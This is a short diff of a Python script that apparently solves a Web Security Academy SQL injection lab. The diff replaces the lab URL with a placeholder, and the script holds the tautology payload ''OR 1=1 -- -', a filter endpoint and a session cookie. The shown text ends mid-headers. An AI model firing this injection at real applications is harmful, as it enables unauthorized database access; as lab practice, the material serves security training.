@@ -1,5 +1,5 @@
 import requests
-url = "https://0a7e002a035364f583a7ff5d00b200c5.web-security-academy.net/filter?category=Gifts"
+url = "https://YOUR_HOST/filter?category=Gifts"
 payload = "'OR 1=1 -- -"
 headers={
     "Cookie": "session=dvbIKTOV9yWsnE73xqFmtqvfC1Cq6JuU",
